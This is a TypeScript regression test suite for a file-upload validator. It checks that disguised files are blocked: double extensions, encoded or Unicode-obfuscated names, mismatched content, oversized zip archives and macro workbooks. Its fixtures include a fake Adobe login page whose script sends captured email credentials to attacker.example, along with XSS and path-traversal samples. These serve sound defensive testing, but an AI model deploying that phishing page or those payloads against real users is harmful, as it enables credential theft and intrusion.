import assert from "node:assert/strict"
import { readFileSync } from "node:fs"
import { resolve } from "node:path"

import * as XLSX from "xlsx"

import {
  assertStandardUploadFileName,
  assertUploadFileContentMatchesExtension,
  detectFileContentKind,
  FILE_TYPE_MISMATCH_MESSAGE,
  normalizeUploadFileName,
  sanitizeUploadFileNameForLog,
  UNSAFE_FILE_TYPE_MESSAGE,
  UploadValidationError,
} from "../../src/lib/upload/upload-security"
import { parseCSVStreaming } from "../../src/lib/data/csvLoader"
import {
  assertAccountancyUploadFileContent,
  parseAccountancyUploadBuffer,
  validateAccountancyUpload,
  type AccountancyUploadMeta,
} from "../../src/lib/accountancy/upload-processing"

const repoRoot = resolve(import.meta.dirname, "../..")

function readProjectFile(path: string) {
  return readFileSync(resolve(repoRoot, path), "utf8")
}

// ============================================================================
// Fixtures (in-memory only; none of these contents are ever executed)
// ============================================================================

/**
 * Regression fixture for the real incident: HTML masquerading as a PDF via a
 * double extension, rendering a fake "Adobe Document Cloud / Secured PDF"
 * login that harvests the recipient's email credentials.
 */
const PHISHING_HTML = `<!DOCTYPE html>
<html>
<head><title>Adobe Document Cloud - Secured PDF</title></head>
<body>
  <div class="login-container">
    <h1>Secured PDF</h1>
    <p>Your document is protected. Sign in to view it.</p>
    <form id="login-form">
      <input type="email" name="email" placeholder="Email address" required>
      <input type="password" name="password" placeholder="Email password" required>
      <button type="submit" onclick="submitCredentials()">View Document</button>
    </form>
  </div>
  <script>
    function submitCredentials() {
      var email = document.getElementById("email").value;
      var pwd = document.getElementById("password").value;
      fetch("https://attacker.example/collect", { method: "POST", body: JSON.stringify({ email, password: pwd }) });
    }
  </script>
</body>
</html>`

const SIMPLE_HTML = "<html><body><h1>Fake invoice</h1><script>alert(1)</script></body></html>"
const SVG_ACTIVE = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle r="5"/></svg>'
const VALID_PDF = Buffer.from(
  "%PDF-1.4\n(Supplier: ACME Ltd)\n(Invoice Number: INV-1001)\n(Total: 121.00)\n%%EOF",
)
const VALID_CSV = "month,revenue\n2026-01,1200\n2026-02,1350\n"

function makeValidXlsxBytes() {
  const workbook = XLSX.utils.book_new()
  const worksheet = XLSX.utils.aoa_to_sheet([
    ["month", "revenue"],
    ["2026-01", 1200],
  ])
  XLSX.utils.book_append_sheet(workbook, worksheet, "Data")
  return XLSX.write(workbook, { type: "buffer", bookType: "xlsx" }) as Buffer
}

function makeValidXlsBytes() {
  const workbook = XLSX.utils.book_new()
  const worksheet = XLSX.utils.aoa_to_sheet([
    ["month", "revenue"],
    ["2026-01", 1200],
  ])
  XLSX.utils.book_append_sheet(workbook, worksheet, "Data")
  return XLSX.write(workbook, { type: "buffer", bookType: "biff8" }) as Buffer
}

// ============================================================================
// Minimal ZIP builder (stored entries) for structural attack fixtures
// ============================================================================

const CRC_TABLE = (() => {
  const table = new Uint32Array(256)
  for (let n = 0; n < 256; n += 1) {
    let c = n
    for (let k = 0; k < 8; k += 1) {
      c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1
    }
    table[n] = c >>> 0
  }
  return table
})()

function crc32(data: Uint8Array) {
  let crc = 0xffffffff
  for (let index = 0; index < data.length; index += 1) {
    crc = CRC_TABLE[(crc ^ data[index]) & 0xff] ^ (crc >>> 8)
  }
  return (crc ^ 0xffffffff) >>> 0
}

interface ZipEntrySpec {
  name: string
  data: Buffer
  /** Overrides the declared uncompressed size in the central directory. */
  declaredUncompressedSize?: number
}

function nameBytes(entry: ZipEntrySpec) {
  return Buffer.from(entry.name, "utf8")
}

function centralHeader(
  entry: ZipEntrySpec,
  crc: number,
  declaredUncompressedSize: number,
  localOffset: number,
) {
  const name = nameBytes(entry)
  const centralHeaderBuffer = Buffer.alloc(46)
  centralHeaderBuffer.writeUInt32LE(0x02014b50, 0)
  centralHeaderBuffer.writeUInt16LE(20, 4)
  centralHeaderBuffer.writeUInt16LE(20, 6)
  centralHeaderBuffer.writeUInt16LE(0, 8)
  centralHeaderBuffer.writeUInt16LE(0, 10)
  centralHeaderBuffer.writeUInt16LE(0, 12)
  centralHeaderBuffer.writeUInt16LE(0, 14)
  centralHeaderBuffer.writeUInt32LE(crc, 16)
  centralHeaderBuffer.writeUInt32LE(entry.data.length, 20)
  centralHeaderBuffer.writeUInt32LE(declaredUncompressedSize, 24)
  centralHeaderBuffer.writeUInt16LE(name.length, 28)
  centralHeaderBuffer.writeUInt16LE(0, 30)
  centralHeaderBuffer.writeUInt16LE(0, 32)
  centralHeaderBuffer.writeUInt16LE(0, 34)
  centralHeaderBuffer.writeUInt16LE(0, 36)
  centralHeaderBuffer.writeUInt32LE(localOffset, 42)
  return centralHeaderBuffer
}

function localHeaderFor(entry: ZipEntrySpec, name: Buffer, crc: number) {
  const localHeader = Buffer.alloc(30)
  localHeader.writeUInt32LE(0x04034b50, 0)
  localHeader.writeUInt16LE(20, 4)
  localHeader.writeUInt16LE(0, 6)
  localHeader.writeUInt16LE(0, 8)
  localHeader.writeUInt16LE(0, 10)
  localHeader.writeUInt16LE(0, 12)
  localHeader.writeUInt32LE(crc, 14)
  localHeader.writeUInt32LE(entry.data.length, 18)
  localHeader.writeUInt32LE(entry.data.length, 22)
  localHeader.writeUInt16LE(name.length, 26)
  localHeader.writeUInt16LE(0, 28)
  return localHeader
}

function localPartsAdd(localParts: Buffer[], localHeader: Buffer, name: Buffer, data: Buffer) {
  localParts.push(localHeader, name, data)
}

function assembleZip(localParts: Buffer[], centralParts: Buffer[], entryCount: number) {
  const localSection = Buffer.concat(localParts)
  const centralDirectory = Buffer.concat(centralParts)
  const eocd = Buffer.alloc(22)
  eocd.writeUInt32LE(0x06054b50, 0)
  eocd.writeUInt16LE(0, 4)
  eocd.writeUInt16LE(0, 6)
  eocd.writeUInt16LE(entryCount, 8)
  eocd.writeUInt16LE(entryCount, 10)
  eocd.writeUInt32LE(centralDirectory.length, 12)
  eocd.writeUInt32LE(localSection.length, 16)
  eocd.writeUInt16LE(0, 20)
  return Buffer.concat([localSection, centralDirectory, eocd])
}

function buildZipFile(entries: ZipEntrySpec[]) {
  const localParts: Buffer[] = []
  const centralParts: Buffer[] = []
  let offset = 0

  for (const entry of entries) {
    const name = nameBytes(entry)
    const crc = crc32(entry.data)
    const localHeader = localHeaderFor(entry, name, crc)
    localPartsAdd(localParts, localHeader, name, entry.data)
    centralParts.push(centralHeader(entry, crc, entry.declaredUncompressedSize ?? entry.data.length, offset))
    centralParts.push(name)
    offset += localHeader.length + name.length + entry.data.length
  }

  return assembleZip(localParts, centralParts, entries.length)
}

// ============================================================================
// Helpers
// ============================================================================

function makeFile(content: Buffer | string, name: string, mimeType = "") {
  return new File([Buffer.from(content)], name, { type: mimeType })
}

async function assertUploadRejected(
  action: () => Promise<unknown> | unknown,
  code: string,
  message: string,
) {
  await assert.rejects(
    async () => await action(),
    (error: unknown) =>
      error instanceof UploadValidationError && error.code === code,
    message,
  )
}

const PHISHING_FILE_NAMES = [
  "Payment Slip.pdf.html",
  "invoice.pdf.html",
  "invoice.PDF.HTML",
  "report.xlsx.html",
  "orders.csv.html",
  "invoice.pdf.js",
  "report.xlsx.exe",
  "data.csv.svg",
  "invoice.pdf.svg",
  "invoice.pdf.htm",
  "invoice.pdf.xhtml",
  "invoice.pdf.mjs",
  "invoice.pdf.bat",
  "invoice.pdf.vbs",
]

async function main() {
  await testIncidentRegression();
  await testDoubleExtensionFilenameRejection();
  await testFilenameObfuscationTricks();
  await testLegitimateMultiDotFilename();
  await testContentMismatchRejection();
  await testAccountancyIngestion();
  await testZipResourceAbuse();
  await testFilenameXssSafety();
  await testSecurityLoggingSafety();
  testRouteWiring();
  console.log("Upload security regression tests passed.");
}

/**
 * Section 11: the real-world incident fixture must be blocked before parsing,
 * preview, storage, or AI analysis. The block happens inside the shared
 * standard-upload validation that every standard ingestion path calls.
 */
async function testIncidentRegression() {
  const incident = makeFile(PHISHING_HTML, "Payment Slip.pdf.html", "text/html")

  await assertUploadRejected(
    () => parseCSVStreaming(incident, 100),
    "UNSAFE_FILE_TYPE",
    "incident fixture is rejected before parsing",
  )

  await assertUploadRejected(
    () => assertUploadFileContentMatchesExtension(Buffer.from(PHISHING_HTML), "orders.csv"),
    "UNSAFE_FILE_TYPE",
    "HTML renamed to .csv is rejected as active content",
  )

  await assertUploadRejected(
    () => assertUploadFileContentMatchesExtension(Buffer.from(PHISHING_HTML), "invoice.pdf"),
    "UNSAFE_FILE_TYPE",
    "HTML renamed to .pdf is rejected as active content",
  )

  await assertUploadRejected(
    () => assertUploadFileContentMatchesExtension(Buffer.from(PHISHING_HTML), "report.xlsx"),
    "UNSAFE_FILE_TYPE",
    "HTML renamed to .xlsx is rejected as active content",
  )
}

async function testDoubleExtensionFilenameRejection() {
  for (const fileName of PHISHING_FILE_NAMES) {
    await assertUploadRejected(
      () => parseCSVStreaming(makeFile("month,revenue\n2026-01,1\n", fileName), 100),
      "UNSAFE_FILE_TYPE",
      `${fileName} must be rejected by filename analysis before parsing`,
    )
  }

  for (const fileName of ["invoice.pdf.html", "report.xlsx.exe", "data.csv.svg", "invoice.pdf.js"]) {
    assert.throws(
      () => validateAccountancyUpload(baseMeta("pdf", fileName, "application/pdf")),
      (error: unknown) => error instanceof Error && error.message === UNSAFE_FILE_TYPE_MESSAGE,
      `accountancy rejects ${fileName}`,
    )
  }
}

async function testFilenameXssSafety() {
  const xssFileName = '<img src=x onerror=alert(1)>.csv'
  const accepted = await parseCSVStreaming(
    makeFile("month,revenue\n2026-01,1\n", xssFileName, "text/csv"),
    100,
  )
  assert.deepEqual(accepted.columns, ["month", "revenue"], "filename XSS payload is stored as inert data only")

  const sanitized = sanitizeUploadFileNameForLog(`<script>alert(1)</script>\u0000payload\u001b.csv\n`)
  assert.ok(!/[\u0000-\u001f\u007f]/.test(sanitized), "sanitized log filenames contain no control characters")
  assert.ok(!sanitized.includes("\n"), "sanitized log filenames contain no newlines")
  assert.equal(JSON.parse(JSON.stringify({ name: sanitized })).name, sanitized, "sanitized filenames survive JSON encoding")
}

async function testFilenameObfuscationTricks() {
  // Null-byte style tricks
  await assertUploadRejected(
    () => parseCSVStreaming(makeFile("month,revenue\n2026-01,1\n", "invoice.pdf.html\u0000.csv"), 100),
    "UNSAFE_FILE_TYPE",
    "null-byte hidden double extension is rejected",
  )

  // Percent-encoded extension chains (single and double encoded)
  await assertUploadRejected(
    () => parseCSVStreaming(makeFile("month,revenue\n2026-01,1\n", "%69nvoice.pdf.html"), 100),
    "UNSAFE_FILE_TYPE",
    "percent-encoded filename is decoded before analysis",
  )
  await assertUploadRejected(
    () => parseCSVStreaming(makeFile("month,revenue\n2026-01,1\n", "%2569nvoice.pdf.html"), 100),
    "UNSAFE_FILE_TYPE",
    "double-encoded filename is decoded before analysis",
  )

  // Trailing spaces and dots
  await assertUploadRejected(
    () => parseCSVStreaming(makeFile("month,revenue\n2026-01,1\n", "invoice.pdf.html   "), 100),
    "UNSAFE_FILE_TYPE",
    "trailing spaces do not hide the dangerous extension",
  )
  await assertUploadRejected(
    () => parseCSVStreaming(makeFile("month,revenue\n2026-01,1\n", "orders.csv.html..."), 100),
    "UNSAFE_FILE_TYPE",
    "trailing dots do not hide the dangerous extension",
  )

  // Unicode lookalike characters
  await assertUploadRejected(
    () => parseCSVStreaming(makeFile("month,revenue\n2026-01,1\n", "invoice.pdf.htmｌ"), 100),
    "UNSAFE_FILE_TYPE",
    "Unicode fullwidth characters normalize before analysis",
  )
  await assertUploadRejected(
    () => parseCSVStreaming(makeFile("month,revenue\n2026-01,1\n", "invoice\u200b.pdf.html"), 100),
    "UNSAFE_FILE_TYPE",
    "zero-width characters do not hide the dangerous extension",
  )

  // Mixed case
  await assertUploadRejected(
    () => parseCSVStreaming(makeFile("month,revenue\n2026-01,1\n", "Invoice.Pdf.HtMl"), 100),
    "UNSAFE_FILE_TYPE",
    "extension checks are case-insensitive",
  )

  // Path separators are not treated as extension separators; storage keys
  // sanitize path separators separately.
  const normalized = normalizeUploadFileName("../../etc/passwd.csv")
  assert.equal(normalized.finalExtension, ".csv")
  assert.equal(normalized.baseName, "passwd")
}

async function testLegitimateMultiDotFilename() {
  const workbookBytes = makeValidXlsxBytes()
  const parsed = await parseCSVStreaming(
    makeFile(workbookBytes, "sales.report.september.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
    100,
  )
  assert.deepEqual(parsed.columns, ["month", "revenue"], "legitimate multi-dot filename keeps working")
  assert.equal(parsed.rowCount, 1)
}

async function testContentMismatchRejection() {
  // Magic-byte mismatch: PNG bytes renamed to a PDF claim
  await assertUploadRejected(
    () => assertUploadFileContentMatchesExtension(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), "invoice.pdf"),
    "FILE_TYPE_MISMATCH",
    "image content renamed to .pdf is rejected",
  )

  // PDF bytes renamed to a CSV claim
  await assertUploadRejected(
    () => assertUploadFileContentMatchesExtension(VALID_PDF, "data.csv"),
    "FILE_TYPE_MISMATCH",
    "PDF content renamed to .csv is rejected",
  )

  // Generic ZIP renamed to an XLSX claim (valid zip, no workbook parts)
  const genericZip = buildZipFile([
    { name: "readme.txt", data: Buffer.from("hello") },
  ])
  await assertUploadRejected(
    () => assertUploadFileContentMatchesExtension(genericZip, "report.xlsx"),
    "FILE_TYPE_MISMATCH",
    "non-workbook ZIP renamed to .xlsx is rejected",
  )

  // Valid formats still pass
  assert.equal(detectFileContentKind(VALID_PDF), "pdf")
  assert.equal(detectFileContentKind(makeValidXlsBytes()), "ole")
  assert.equal(detectFileContentKind(makeValidXlsxBytes()), "zip")
  assert.equal(detectFileContentKind(Buffer.from("month,revenue\n1,2\n")), "text")

  const parsedXlsx = await parseCSVStreaming(
    makeFile(makeValidXlsxBytes(), "report.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
    100,
  )
  assert.deepEqual(parsedXlsx.columns, ["month", "revenue"])

  const parsedXls = await parseCSVStreaming(
    makeFile(makeValidXlsBytes(), "ledger.xls", "application/vnd.ms-excel"),
    100,
  )
  assert.deepEqual(parsedXls.columns, ["month", "revenue"])

  const parsedCsv = await parseCSVStreaming(
    makeFile("month,revenue\n2026-01,1200\n", "report.csv", "text/csv"),
    100,
  )
  assert.deepEqual(parsedCsv.columns, ["month", "revenue"])
}

async function testAccountancyIngestion() {
  // Valid PDF flows through the accountancy document processor
  const parsedPdf = await parseAccountancyUploadBuffer(
    VALID_PDF,
    baseMeta("pdf", "invoice.pdf", "application/pdf"),
  )
  assert.equal(parsedPdf.route, "accountancy_pdf_document_processor")
  assert.notEqual(parsedPdf.documentTextStatus, "scanner_required")

  // The incident file cannot enter the accountancy PDF flow
  await assertAccountancyUploadContentRejected(Buffer.from(PHISHING_HTML), "invoice.pdf", "application/pdf")

  // HTML masquerading as an Excel workbook cannot enter the accountancy flow
  await assertAccountancyUploadContentRejected(Buffer.from(SIMPLE_HTML), "report.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")

  // Accountancy CSV ingest still works
  const parsedCsv = await parseAccountancyUploadBuffer(
    Buffer.from("date,description,amount\n2026-01-01,Software,12.50\n"),
    baseMeta("csv", "ledger.csv", "text/csv"),
  )
  assert.equal(parsedCsv.rowCount, 1)
}

async function assertAccountancyUploadContentRejected(
  buffer: Buffer,
  fileName: string,
  mimeType: string,
) {
  await assert.rejects(
    async () => assertAccountancyUploadFileContent(buffer, baseMeta("pdf", fileName, mimeType)),
    (error: unknown) =>
      error instanceof Error && error.message === UNSAFE_FILE_TYPE_MESSAGE,
    `${fileName} must be rejected by accountancy content verification`,
  )
}

function baseMeta(
  uploadType: AccountancyUploadMeta["uploadType"],
  fileName: string,
  mimeType: string,
): AccountancyUploadMeta {
  return {
    fileName,
    mimeType,
    size: 1024,
    uploadType,
    datasetType: "accountancy",
  }
}

async function testZipResourceAbuse() {
  // An XLSX archive whose central directory claims an unrealistic
  // decompressed size is rejected before any parser inflates it.
  const fakeBomb = buildZipFile([
    {
      name: "xl/worksheets/sheet1.xml",
      data: Buffer.from("<worksheet/>"),
      declaredUncompressedSize: 700 * 1024 * 1024,
    },
    { name: "[Content_Types].xml", data: Buffer.from("<Types/>") },
    { name: "xl/workbook.xml", data: Buffer.from("<workbook/>") },
  ])
  await assertUploadRejected(
    () => assertUploadFileContentMatchesExtension(fakeBomb, "bomb.xlsx"),
    "UNSAFE_FILE_TYPE",
    "XLSX archives declaring oversized decompressed content are rejected",
  )

  // A workbook archive carrying a VBA macro project is rejected.
  const macroWorkbook = buildZipFile([
    { name: "[Content_Types].xml", data: Buffer.from("<Types/>") },
    { name: "xl/workbook.xml", data: Buffer.from("<workbook/>") },
    { name: "xl/worksheets/sheet1.xml", data: Buffer.from("<sheet/>") },
    { name: "xl/vbaProject.bin", data: Buffer.from("\u00e0\u00b1_\u00ba Project") },
  ])
  await assertUploadRejected(
    () => assertUploadFileContentMatchesExtension(macroWorkbook, "macro.xlsx"),
    "UNSAFE_FILE_TYPE",
    "XLSX archives with macro projects are rejected",
  )
}

async function testSecurityLoggingSafety() {
  const originalWarn = console.warn
  const captured: string[] = []
  console.warn = (...args: unknown[]) => {
    captured.push(args.map(String).join(" "))
  }

  try {
    await assertUploadFileContentMatchesExtension(Buffer.from(PHISHING_HTML), "invoice.pdf")
    assert.fail("expected rejection")
  } catch {
    // expected
  } finally {
    console.warn = originalWarn
  }

  assert.equal(captured.length, 1, "exactly one security rejection record is logged")
  const record = captured[0]
  assert.ok(record.includes("[UPLOAD-SECURITY]"), "security log uses a stable prefix")
  assert.ok(record.includes("UNSAFE_FILE_TYPE"), "security log includes the rejection code")
  assert.ok(record.includes("invoice.pdf"), "security log includes the sanitized filename")
  assert.ok(record.includes("html"), "security log includes the detected type")
  assert.ok(!record.includes("attacker.example"), "security log never includes file contents")
  assert.ok(!record.includes("submitCredentials"), "security log never includes file contents")
  assert.ok(!record.includes("password"), "security log never includes credential placeholders")
  const parsedRecord = JSON.parse(record.replace("[UPLOAD-SECURITY] ", ""))
  assert.ok(parsedRecord.timestamp, "security log includes a timestamp")
  assert.ok(parsedRecord.source, "security log includes the upload source")
  assert.ok(parsedRecord.reason, "security log includes a rejection reason category")
}

function testRouteWiring() {
  const uploadRoute = readProjectFile("src/app/api/upload/route.ts")
  assert.ok(uploadRoute.includes('"UNSAFE_FILE_TYPE"'), "canonical upload API maps UNSAFE_FILE_TYPE rejections")
  assert.ok(uploadRoute.includes('"FILE_TYPE_MISMATCH"'), "canonical upload API maps FILE_TYPE_MISMATCH rejections")

  const uploadAction = readProjectFile("src/app/actions/upload.ts")
  assert.ok(uploadAction.includes("uploadValidationOptions"), "canonical upload action passes security options to the shared validator")

  const accountancyRoute = readProjectFile("src/app/api/accountancy/upload/route.ts")
  assert.ok(accountancyRoute.includes("processAccountancyUpload"), "accountancy route delegates to the secured processing pipeline")

  const uploadHandler = readProjectFile("src/lib/data/upload-handler.ts")
  assert.ok(uploadHandler.includes("assertUploadFileContentMatchesExtension"), "dataset file ingestion verifies content before storing or parsing")

  assert.equal(
    UNSAFE_FILE_TYPE_MESSAGE,
    "UseClevr blocked this file because its actual file type does not match the document format indicated by its filename.",
    "the user-facing security message stays professional and non-technical",
  )
  assert.notEqual(FILE_TYPE_MISMATCH_MESSAGE, UNSAFE_FILE_TYPE_MESSAGE, "mismatch and unsafe-type rejections are distinguishable")
}

main().catch((error) => {
  console.error(error instanceof Error ? (error.stack || error.message) : String(error))
  process.exit(1)
})
